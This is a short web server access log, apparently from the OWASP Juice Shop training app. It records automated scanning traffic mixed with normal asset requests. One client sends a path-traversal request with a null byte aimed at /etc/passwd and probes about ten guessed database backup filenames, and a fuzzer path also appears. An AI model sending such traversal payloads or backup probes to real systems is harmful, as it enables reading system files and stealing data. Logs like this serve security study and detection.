49.36.97.128 - - [04/Aug/2025:04:32:25 +0000] "GET /util/barcode.php?type=../../../../../../../../../../../etc/passwd%00 HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
34.136.217.65 - - [04/Aug/2025:04:32:25 +0000] "GET /app/node_modules/polyfills.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:25 +0000] "GET /juice-database.sql.tar HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:26 +0000] "GET /juice_dump.sql.tar HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:26 +0000] "GET /juice-dump.sql.tar HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:26 +0000] "GET /juice_backup.sql.tar HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:26 +0000] "GET /juice-backup.sql.tar HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
34.136.217.65 - - [04/Aug/2025:04:32:26 +0000] "GET /app/node_modules/morgan/runtime.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:26 +0000] "GET /backup-juice.sql.tar HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
34.136.217.65 - - [04/Aug/2025:04:32:27 +0000] "GET /app/build/routes/polyfills.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:32:27 +0000] "GET /app/build/routes/polyfills.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:32:27 +0000] "GET /app/node_modules/polyfills.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:27 +0000] "GET /backup_juice.sql.tar HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
34.136.217.65 - - [04/Aug/2025:04:32:27 +0000] "GET /assets/public/runtime.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:32:27 +0000] "GET /assets/public/runtime.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:27 +0000] "GET /juice-shop.herokuapp.com.sql.tar HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
2001:ee0:8209:632:69fa:39ee:74cd:7e3a - - [04/Aug/2025:04:32:27 +0000] "GET /FUZZ/socket.io/?EIO=4&transport=polling&t=PXpMYn6 HTTP/1.1" 200 - "https://demo.owasp-juice.shop/FUZZ" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
4.187.148.47 - - [04/Aug/2025:04:32:27 +0000] "GET /zt/ HTTP/1.1" 200 - "-" "PostmanRuntime/7.39.1"
